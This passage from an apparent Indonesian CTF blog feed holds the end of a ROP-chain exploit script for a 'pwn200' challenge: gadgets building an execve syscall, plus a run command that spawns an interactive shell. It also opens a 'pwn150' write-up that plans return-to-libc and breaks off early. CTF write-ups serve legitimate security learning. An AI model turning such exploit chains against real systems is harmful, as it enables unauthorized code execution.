p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x000000000042695f&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# xor rax, rax ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x00000000004755c1&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# mov qword ptr [rsi], rax ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x00000000004005d5&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# pop rdi ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x00000000006cb080&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# @ .data&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000401817&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# pop rsi ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x00000000006cb088&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# @ .data + 8&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000442d86&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# pop rdx ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x00000000006cb088&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# @ .data + 8&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x000000000042695f&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# xor rax, rax ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000468475&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# syscall ; ret&lt;/span&gt;
&lt;span style=&quot;color:#e28964;&quot;&gt;print&lt;/span&gt; p
&lt;/pre&gt;

&lt;p&gt;Jalankan script nya.&lt;/p&gt;
&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;(python exp.py&lt;span style=&quot;color:#e28964;&quot;&gt;;&lt;/span&gt; cat) &lt;span style=&quot;color:#e28964;&quot;&gt;|&lt;/span&gt; ./echo
&lt;/pre&gt;

&lt;p&gt;Setelah itu akan mendapatkan interactive shell.&lt;/p&gt;
</description>
        <pubDate>Mon, 06 Nov 2017 00:00:00 +0700</pubDate>
        <link>https://rhama.my.id/ctf/2017/11/06/cyber-jawara-2017-final-pwn200.html</link>
        <guid isPermaLink="true">https://rhama.my.id/ctf/2017/11/06/cyber-jawara-2017-final-pwn200.html</guid>
        
        <category>cyber-jawara2017</category>
        
        <category>CTF</category>
        
        
        <category>CTF</category>
        
      </item>
    
      <item>
        <title>Bugs Bunny 2k17 CTF - Pwn150</title>
        <description>&lt;p&gt;Diberikan file ELF binary bernama &lt;code class=&quot;highlighter-rouge&quot;&gt;pwn150&lt;/code&gt; 64-Bit yang harus dibuatkan exploit nya agar bisa mendapatkan flag.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;➜  file pwn150
pwn150: ELF 64-bit LSB executable, x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 2.6.32, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dc1ada44067255e5211fafc5133679404b54f110, not stripped&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Elf binary tersebut diproteksi NX (No-eXecute)&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Karena NX enabled, saya berasumsi untuk mengeksploitnya menggunakan teknik &lt;code class=&quot;highlighter-rouge&quot;&gt;Return-to-libc&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Menggunakan &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt; diketahui terdapat 3 user defined function yaitu &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;today&lt;/code&gt; dan &lt;code class=&quot;highlighter-rouge&quot;&gt;Hello&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;info functions
All defined functions:

